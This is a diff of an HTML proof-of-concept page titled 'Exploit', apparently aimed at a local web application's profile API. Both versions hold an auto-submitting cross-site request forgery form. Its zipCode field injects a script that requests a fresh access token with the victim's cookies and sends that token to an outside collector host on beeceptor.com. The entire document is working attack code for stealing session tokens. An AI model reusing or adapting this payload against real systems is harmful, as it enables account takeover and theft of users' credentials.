@@ -1,5 +1,17 @@
-<form action="https://127.0.0.1:5000/api/profile" method="POST" enctype="text/plain">
-  <input name='{"name":"admin","phone":"123","zipCode":"\"><script>fetch(\"/api/access/generate\",{credentials:\"include\"}).then(r=>r.json()).then(d=>{fetch(\"https://anas0x1.free.beeceptor.com/log?token=\"+encodeURIComponent(d.access_token))});</script>"}' value=''>
-  <input type="submit">
-</form>
-<script>document.forms[0].submit();</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit</title>
+</head>
+<body>
+    <form id="csrf" action="https://127.0.0.1:5000/api/profile" method="POST">
+        <input type="hidden" name="name" value="admin">
+        <input type="hidden" name="phone" value="123">
+        <input type="hidden" name="zipCode" value='"><script>fetch("/api/access/generate",{credentials:"include"}).then(r=>r.json()).then(d=>{fetch("https://anas0x1.free.beeceptor.com/log?token="+encodeURIComponent(d.access_token))});</script>'>
+        <input type="submit">
+    </form>
+    <script>
+        document.getElementById('csrf').submit();
+    </script>
+</body>
+</html>
